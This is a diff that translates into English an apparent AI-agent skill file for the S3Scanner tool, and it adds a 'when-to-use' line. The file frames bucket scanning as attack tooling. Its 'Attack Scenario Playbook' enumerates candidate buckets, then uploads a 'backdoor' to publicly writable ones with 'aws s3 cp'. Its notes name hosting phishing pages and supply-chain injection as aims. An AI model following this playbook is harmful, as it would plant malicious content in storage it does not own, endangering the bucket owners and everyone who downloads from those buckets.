@@ -2,38 +2,42 @@
 name: s3scanner-buckets
 description: "S3Scanner: Exploits misconfigured S3 buckets. Signals: cloud privilege escalation, IAM privilege escalation, detect bucket configuration, batch, list objects."
 zh-signals: "S3Scanner: S3 桶错误配置利用。信号:云提权,iam提权,检测桶配置,批量,列对象。"
+when-to-use: >-
+  Use when you have a list of S3 bucket name candidates and need to detect
+  misconfigurations, enumerate objects, and find publicly writable buckets for
+  cloud privilege escalation or supply-chain injection.
 ---
 
 # S3Scanner
 
-- 攻击大类:C18 云与容器提权
-- 上游仓库:https://github.com/sa7mon/S3Scanner
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C18 Cloud and Container Privilege Escalation
+- Upstream Repository: https://github.com/sa7mon/S3Scanner
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
-pip install s3scanner 或 go install
+pip install s3scanner or go install
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `s3scanner -b bucket-name` | 检测桶配置 |
-| `-l buckets.txt` | 批量 |
-| `--enumerate` | 列对象 |
-| `--include-closed` | 含 403 桶 |
+| `s3scanner -b bucket-name` | Detect bucket configuration |
+| `-l buckets.txt` | Batch |
+| `--enumerate` | List objects |
+| `--include-closed` | Include buckets returning 403 |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### S3 桶错误配置利用
+### S3 Bucket Misconfiguration Exploitation
 
 ```bash
 s3scanner -l candidate-buckets.txt --enumerate
-# 发现 publicly-writable 桶 → aws s3 cp backdoor s3://bucket/ 托管恶意内容
+# Find publicly-writable buckets → aws s3 cp backdoor s3://bucket/ to host malicious content
 ```
 
-## 注意事项
+## Notes
 
-从名字候选批量筛可读写 S3 桶;writeable 桶可托管钓鱼页面/注入供应链。
+Batch-screens readable/writable S3 buckets from name candidates; writable buckets can host phishing pages or inject a supply chain.
